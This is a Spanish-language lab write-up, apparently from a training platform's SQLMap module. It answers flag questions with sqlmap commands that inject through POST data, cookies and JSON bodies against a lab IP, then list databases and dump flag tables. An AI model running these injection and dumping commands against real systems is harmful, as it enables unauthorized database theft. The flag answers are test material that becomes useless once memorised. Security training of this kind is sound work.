# SQLMap Essentials

{% file src="../.gitbook/assets/Sqlmap_Essentials_Module_Cheat_Sheet.pdf" %}

## Getting Started

### SQLMap Overview

#### Preguntas

**What's the fastest SQLi type?**

UNION query-based

## Building Attacks

### Running SQLMap on an HTTP Request

#### Preguntas

**What's the contents of table flag2? (Case #2)**

Vemos cómo se llaman las bases de datos.

```
sqlmap -u 'http://94.237.57.211:53268/case2.php' --data 'id=1*' --method POST -H 'Content-Type: application/x-www-form-urlencoded' --dbs
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Sabiendo como se llama realizamos lo siguiente para ver lo que contiene en dicha tabla.

```
 sqlmap -u 'http://94.237.57.211:53268/case2.php' \
  --data 'id=1*' --method POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -D testdb -T flag2 --dump
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**What's the contents of table flag3? (Case #3)**

```
sqlmap -u "http://94.237.57.211:53268/case3.php" --cookie 'id=1*' -T flag3 --dump
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

What's the contents of table flag4? (Case #4)

```
sqlmap -u 'http://94.237.57.211:53268/case4.php' -H 'Content-Type: application/json' --data '{"id":1}' -T flag4 --dump --method POST
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
